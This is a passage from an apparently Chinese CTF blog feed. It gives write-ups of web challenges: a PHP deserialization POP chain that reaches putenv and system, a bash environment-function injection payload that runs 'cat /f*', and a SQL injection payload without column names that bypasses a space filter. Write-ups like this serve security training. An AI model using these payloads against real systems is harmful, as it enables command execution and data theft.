function_ invoke__">begin0fweb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">begin0fweb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;welcome-&gt;you = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;  Welcome to new year!  &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">            <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>反序列化最终触发putenv()，这里和虎符CTF的ezphp很像，但是提示说了RUN ln -sf &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh，那么system调用的就是bash -c，与p🐂的环境变量注入就一样了，直接利用环境变量注入执行命令</p><p>反序列化链：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>=<span class="string">&quot;Worries&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">start</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SE</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CR</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ET</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;year=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;last=<span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:38989/?get[BASH_FUNC_echo%25%25]=()%20&#123;%20cat /f*;%20&#125;</span><br><span class="line">POST:</span><br><span class="line">go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754303.png" alt="image-20240218204623551"></p><h1 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h1><p>无列名注入，过滤空格，使用&#x2F;**&#x2F;代替</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)a%23</span><br></pre></td></tr></table></figure><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221754149.png" alt="image-20240220110233228"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;100％-upload&quot;&gt;&lt;a href=&quot;#100％-upload&quot; class=&quot;headerlink&quot; title=&quot;100％_upload&quot;&gt;&lt;/a&gt;100％_upload&lt;/h1&gt;&lt;p&gt;打开环境发现文件包含&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https:</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
</feed>
